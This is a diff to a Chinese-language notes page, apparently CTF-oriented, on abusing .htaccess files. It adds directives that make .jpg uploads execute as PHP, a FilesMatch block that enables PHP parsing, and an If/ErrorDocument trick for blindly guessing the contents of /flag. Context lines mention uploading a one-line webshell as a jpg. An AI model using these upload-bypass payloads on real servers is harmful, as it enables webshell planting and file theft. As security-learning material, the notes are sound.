@@ -161,6 +161,9 @@ https://htaccess.iapolo.com/ 在线生成各种功能的htaccess文件
 1、.htaccess文件内容为
 ```
  AddType application/x-httpd-php .jpg
+ 
+ AddHandler php5-script .jpg
+ 
 ```
  然后再上传后缀为jpg的一句话即可。
 
@@ -237,6 +240,35 @@ htaccess 大小写不敏感
 php_value auto_prepend_file  ".htaccess"
 # <?php phpinfo(); ?>
 ```
+
+
+6、其他奇怪操作
+
+开启php 解析 (2021-5-11补充)
+
+```
+<FilesMatch "xxx">
+SetHandler application/x-httpd-php
+php_flag engine on
+</FilesMatch>
+```
+
+
+
+盲注猜文件
+
+```
+<If "file('/flag')=~ /flag{a/">
+ErrorDocument 404 "wupco"
+</If>
+```
+
+
+
+
+
+
+
 本地测试发现，会爆500错误
 [![1qLd4P.md.png](https://s2.ax1x.com/2020/02/13/1qLd4P.md.png)](https://imgchr.com/i/1qLd4P)
 phpstudy_pro中php版本 测试无一成功，用phpstudy2018版本中，仅非nts版本测试成功，
